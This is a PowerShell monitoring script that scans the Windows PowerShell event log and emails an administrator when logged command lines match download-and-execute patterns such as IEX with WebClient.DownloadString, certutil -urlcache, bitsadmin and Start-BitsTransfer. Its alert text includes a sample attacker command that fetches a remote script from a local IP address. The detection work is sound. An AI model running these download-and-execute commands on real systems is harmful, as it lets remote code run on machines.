<#
.Synopsis
    Trace-PowerShellAttack is a cmdlet created for Task Scheduler to find malicious commands executed in PowerShell.
    I suggest having it run once every 15 minutes to keep alerts somewhat live.
    
.DESCRIPTION
    The Trace-PowerShellAttack cmdlet looks at executed commands and alerts an admin by email if the command matches a common attack.
    The attacker command doesn't have to be successful it just has to be executed.

.NOTES
    Author: Rob Osborne 
    Alias: tobor
    Contact: rosborne@osbornepro.com
    https://roberthosborne.com

.EXAMPLE
   Trace-PowerShellAttack

.EXAMPLE
   Trace-PowerShellAttack -Verbose
#>

Function Trace-PowerShellAttack {
    [CmdletBinding()]
        param() # End param

  BEGIN {

$Css = @"
<style>
table {
    font-family: verdana,arial,sans-serif;
        font-size:11px;
        color:#333333;
        border-width: 1px;
        border-color: #666666;
        border-collapse: collapse;
}
th {
        border-width: 1px;
        padding: 8px;
        border-style: solid;
        border-color: #666666;
        background-color: #dedede;
}
td {
        border-width: 1px;
        padding: 8px;
        border-style: solid;
        border-color: #666666;
        background-color: #ffffff;
}
</style>
"@
    
    $FromEmail = "from@osbornepro.com"
    
    $SmtpServer = "smtpserver.com"
    
    $Comput = $env:COMPUTERNAME

    Write-Verbose "Pulling events"
    
    $BadEvent = Get-WinEvent -FilterHashtable @{logname="Windows PowerShell"; id=800} -MaxEvents 100 | Where-Object {$_.Message -like "*Pipeline execution details for command line: IEX (New-Object net.webclient).downloadstring(*"}

    Write-Verbose "Checking... `nIf command uses IEX this checks for a download method to gain an IP Address of the attacker machine."
   
} # End BEGIN

  PROCESS {

    if (($BadEvent.Properties.Item(0) | Select-Object -ExpandProperty Value | Out-String) -like "IEX (New-Object net.webclient).downloadstring(*") {$EventInfo = $BadEvent}

    elseif (($BadEvent.Properties.Item(0) | Select-Object -ExpandProperty Value | Out-String) -like "certutil* -urlcache -split -f *") {$EventInfo = $BadEvent}

    elseif (($BadEvent.Properties.Item(0) | Select-Object -ExpandProperty Value | Out-String) -like "bitsadmin*") {$EventInfo = $BadEvent}

    elseif (($BadEvent.Properties.Item(0) | Select-Object -ExpandProperty Value | Out-String) -like "Start-BitsTransfer*") {$EventInfo = $BadEvent}

    $More = $EventInfo.Properties.Item(0)

  } # End PROCESS

  END {

    if ($More.Value -like "*IEX (New-Object net.webclient).downloadstring(*") {

        $TableInfo = $EventInfo | Select-Object -Property MachineName, Message 

        $PreContent = "<Title>PowerShell RCE Monitoring Alert: Watches for Malicious Commands</Title>"

        $NoteLine = "$(Get-Date -format 'MM/dd/yyyy HH:mm:ss')"

        $PostContent = "<br><p><font size='2'><i>$NoteLine</i></font>"

        $MailBody = $TableInfo | ConvertTo-Html -Head $Css -PostContent $PostContent -PreContent $PreContent -Body "If command is like 'IEX (New-Object net.webclient).downloadstring('http://10.0.0.1:8000/Something.ps1')'; an attacker is using a pyhton Simple HTTP Server to try to run commands on our network devices. The http site is the attackers machine. If the command uses bitsadmin or certutil -urlcache -split -f the attacker is trying to download files to the device." | Out-String

        $MailBody += "This is the command that was issued:    "

        $MailBody += $More.Value

        Send-MailMessage -From $FromEmail -To $FromEmail -Subject "AD Event: PowerShell Attack on $comput" -BodyAsHtml -Body $MailBody -SmtpServer $SmtpServer

  } # End END

} # End Function


